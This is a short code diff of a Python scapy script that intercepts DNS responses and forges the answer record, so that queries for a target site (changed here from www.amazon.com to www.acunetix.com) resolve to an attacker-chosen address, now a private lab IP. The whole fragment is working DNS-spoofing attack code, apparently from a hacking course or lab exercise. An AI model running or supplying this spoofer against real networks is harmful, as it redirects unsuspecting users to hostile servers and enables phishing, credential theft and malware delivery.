@@ -8,10 +8,9 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        print(qname)
-        if 'www.amazon.com' in qname.decode():
+        if 'www.acunetix.com' in str(qname):
             print('[+] Spoofing target.')
-            answer = scapy.DNSRR(rrname=qname, rdata='198.185.159.144')
+            answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
